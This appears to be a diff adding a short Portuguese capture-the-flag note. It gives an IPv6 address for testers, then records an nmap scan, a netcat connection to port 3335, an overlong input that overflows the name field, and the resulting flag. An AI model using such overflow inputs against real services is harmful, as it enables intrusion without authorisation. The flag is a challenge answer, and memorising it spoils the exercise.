@@ -1,0 +1,14 @@
+Para a equipe de teste!
+
+Reclamei, reclamei, mas não consegui que um provedor me liberasse um unico IP versão 4, não sei qual a dificuldade!? Disseram que tem um negócio de escassez de IP no mundo... Mas enfim, o projeto foi publicado no IPv6, se vira ai para testar.
+
+2001:19f0:5:14f0:5400:4ff:fe78:b66c
+
+Ass Dev Ooclaar.
+
+nmap. resultado porta 3335
+
+nc 2001:19f0:5:14f0:5400:4ff:fe78:b66c 3335
+Qual seu meu nome? aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Seu nome: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+ALQ{Buffer_over_cmd}
